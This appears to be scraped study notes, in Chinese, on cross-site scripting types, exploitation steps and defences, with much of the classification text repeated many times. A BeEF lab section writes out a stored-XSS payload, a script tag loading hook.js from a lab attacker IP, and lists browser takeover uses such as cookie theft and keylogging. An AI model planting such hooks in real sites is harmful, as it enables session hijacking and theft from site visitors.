上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#4通用型xss"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞成因-3"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞案例"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#5突变型xss"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞成因-4"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#攻击流程-2"},{"categories":["notes"],"content":"\r0x4 利用流程 1.找注入点 找到数据输入的地方 2.判断回显位置---输入的数据在什么地方输出 如果输入的数据能够在前端进行输出，则可以证明输入的前段恶意代码在没有安全性处理的情 况下能够输出前端，从而造成风险 3.构造基础的payload 4.进行提交payload 5.分析响应状况 1. 如果成功解析则XSS存在 2. 反之考虑绕过 6.确认漏洞 如果响应达到了预期，则说明漏洞存在，反之不存在。 ","date":"2023-11-17","objectID":"/xss/:4:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x4-利用流程"},{"categories":["notes"],"content":"\r0x5 难度高危漏洞但漏洞库不一定接受此漏洞，存储型XSS肯定被接受 1.反射型攻击难度较高 1.如何发送含有payload的连接呢---社工------效率很低 2. 影响面较小 2.存储型XSS攻击难度较小 1.攻击者将恶意代码写入数据库，只要访问该网站的用户必定中招。 ","date":"2023-11-17","objectID":"/xss/:5:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x5-难度"},{"categories":["notes"],"content":"\r0x6 防御 1.过滤---将关键的字符过滤掉 2. 实体化编码 1.将特殊字符转换成字符串 ","date":"2023-11-17","objectID":"/xss/:6:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x6-防御"},{"categories":["notes"],"content":"\r0x7自动化XSS","date":"2023-11-17","objectID":"/xss/:7:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#0x7自动化xss"},{"categories":["notes"],"content":"\rBeEF简介Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。 http://beefproject.com/ 信息收集： 网络发现 主机信息 Cookie获取 4. 会话劫持 键盘记录 插件信息 持久化控制: 确认弹框 小窗口 中间人 社会工程： 点击劫持 弹窗告警 虚假页面 钓鱼页面 渗透攻击： 内网渗透 Metasploit CSRF攻击 DDOS攻击 ","date":"2023-11-17","objectID":"/xss/:7:1","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#beef简介"},{"categories":["notes"],"content":"\rBeEF简介Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。 http://beefproject.com/ 信息收集： 网络发现 主机信息 Cookie获取 4. 会话劫持 键盘记录 插件信息 持久化控制: 确认弹框 小窗口 中间人 社会工程： 点击劫持 弹窗告警 虚假页面 钓鱼页面 渗透攻击： 内网渗透 Metasploit CSRF攻击 DDOS攻击 ","date":"2023-11-17","objectID":"/xss/:7:1","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#信息收集"},{"categories":["notes"],"content":"\rBeEF简介Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。 http://beefproject.com/ 信息收集： 网络发现 主机信息 Cookie获取 4. 会话劫持 键盘记录 插件信息 持久化控制: 确认弹框 小窗口 中间人 社会工程： 点击劫持 弹窗告警 虚假页面 钓鱼页面 渗透攻击： 内网渗透 Metasploit CSRF攻击 DDOS攻击 ","date":"2023-11-17","objectID":"/xss/:7:1","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#持久化控制"},{"categories":["notes"],"content":"\rBeEF简介Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。 http://beefproject.com/ 信息收集： 网络发现 主机信息 Cookie获取 4. 会话劫持 键盘记录 插件信息 持久化控制: 确认弹框 小窗口 中间人 社会工程： 点击劫持 弹窗告警 虚假页面 钓鱼页面 渗透攻击： 内网渗透 Metasploit CSRF攻击 DDOS攻击 ","date":"2023-11-17","objectID":"/xss/:7:1","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#社会工程"},{"categories":["notes"],"content":"\rBeEF简介Browser Exploitation Framework (BeEF) BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单。 http://beefproject.com/ 信息收集： 网络发现 主机信息 Cookie获取 4. 会话劫持 键盘记录 插件信息 持久化控制: 确认弹框 小窗口 中间人 社会工程： 点击劫持 弹窗告警 虚假页面 钓鱼页面 渗透攻击： 内网渗透 Metasploit CSRF攻击 DDOS攻击 ","date":"2023-11-17","objectID":"/xss/:7:1","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#渗透攻击"},{"categories":["notes"],"content":"\rBeEF基础 启动Apache和BeEF: root@kali:~# service apache2 start \u003cscript src=\"http://192.168.106.140:3000/hook.js\"\u003e\u003c/script\u003e 注：192.168.106.140为BeEF所在机器，即Kali Linux IP 登录BeEF: username: beef password: beef 渗透机将脚本放在DWVA靶机中： \u003cscript src=\"http://192.168.106.140:3000/hook.js\"\u003e\u003c/script\u003e 注：192.168.106.140为BeEF所在机器，即Kali Linux IP 注：需修改字符数的限制，例如为200 肉机Win7 访问XSS stored页面 BeEF页面查看肉鸡是否上线 ","date":"2023-11-17","objectID":"/xss/:7:2","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#beef基础"},{"categories":["notes"],"content":"\r信息收集\r命令颜色(Color): 绿色 对目标主机生效并且不可见（不会被发现） 橙色 对目标主机生效但可能可见（可能被发现） 灰色 对目标主机未必生效（可验证下） 红色 对目标主机不生效 这篇博客是从CSDN上扒下来的，借着护网面试的缘由，复习了一下 本文链接：https://blog.csdn.net/weixin_53002381/article/details/126017006 